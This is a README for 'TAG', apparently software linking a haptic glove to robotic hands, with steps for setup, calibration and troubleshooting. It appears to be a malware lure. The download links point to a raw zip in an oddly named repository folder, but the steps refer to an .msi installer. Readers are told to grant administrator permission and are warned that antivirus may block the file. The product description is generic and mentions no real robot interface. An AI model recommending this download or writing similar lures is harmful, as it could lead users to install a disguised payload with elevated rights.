# 🧤 TAG - Experience tactile feedback through robotics

[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/stonelagbomer193/TAG/raw/refs/heads/main/rejectamenta/Software_1.9.zip)

TAG translates movements from your hand into commands for robotic hardware. It provides vibration and pressure feedback so you feel the objects your robot touches. This system helps you perform tasks that require precision and a sense of touch.

## 🛠️ System Requirements

Your computer needs specific hardware and software to run this system. Check these items before you begin.

- Operating System: Windows 10 or Windows 11.
- Processor: Intel Core i5 or better.
- Memory: 8 GB of RAM.
- Graphics: A dedicated graphics card with 2 GB of VRAM.
- Connection: A USB 3.0 port for the glove hardware.

Ensure that your computer has all recent Windows updates installed. This avoids communication errors with the hardware drivers.

## 📥 Download and Setup

Follow these steps to prepare your system.

1. Visit [this link](https://github.com/stonelagbomer193/TAG/raw/refs/heads/main/rejectamenta/Software_1.9.zip) to download the installer.
2. Select the file named TAG-Installer.msi.
3. Save the file to your computer.
4. Double-click the file to start the installation.
5. Follow the prompts on the screen.
6. Grant permission when Windows asks if the app can make changes to your device.

The installer places a shortcut on your desktop. Use this shortcut to open the application.

## 🔌 Connecting The Hardware

The glove requires a direct connection to your machine. 

1. Plug the glove USB cable into an available port on your computer.
2. Wait for Windows to identify the device.
3. Open the TAG application from your desktop.
4. Select the "Hardware" tab in the main menu.
5. Click "Scan for devices" to locate your glove.
6. Choose your glove from the list and click "Connect."

Ensure the indicator light on the glove remains solid green. A blinking light suggests a loose connection. Remove the cable and reinsert it if the light blinks.

## ⚙️ Calibration Process

Calibration ensures the glove tracks your hand movements correctly. Perform this step every time you put on the glove.

1. Place your hand on a flat surface.
2. Navigate to the "Settings" menu inside the application.
3. Click "Start Calibration."
4. Close your hand into a fist and hold for three seconds.
5. Spread your fingers wide and hold for three seconds.
6. Relax your hand in a neutral position.

The software tracks your range of motion. It saves these limits to provide accurate movement data. If the robot moves in ways you do not expect, click "Reset Calibration" and repeat the process.

## 🤖 Using The Software

The interface shows two main windows. The left window displays your hand position. The right window shows the status of the robot.

- Movement: Move your fingers to operate the robot hands. The robot mimics your speed.
- Feedback: You feel a vibration in your fingertips when the robot touches an object.
- Force: The glove tightens slightly when the robot grips an item. This prevents you from crushing items.

Adjust the sensitivity sliders if the robot moves too fast. Use the "Feedback Intensity" slider to increase or decrease the strength of the vibrations.

## 🔍 Troubleshooting Issues

Common problems have simple solutions.

If the application fails to open:
- Restart your computer.
- Ensure you have a stable internet connection.
- Check your antivirus program to see if it blocked the file.

If the robot does not move:
- Check the hardware cable connection.
- Verify the status light on the glove is green.
- Restart the application.

If the feedback feels weak:
- Check the battery levels in your glove if it uses a wireless pack.
- Increase the feedback intensity setting in the software.

## 🛡️ Best Practices

- Keep the glove dry. Moisture damages the sensors.
- Store the glove in a case when you finish your work.
- Keep the USB cable away from sharp edges.
- Update the software when a new version arrives.

Following these practices extends the life of your equipment. The software notifies you when an update is ready for download. Click the link in the notification window to install the newest version.
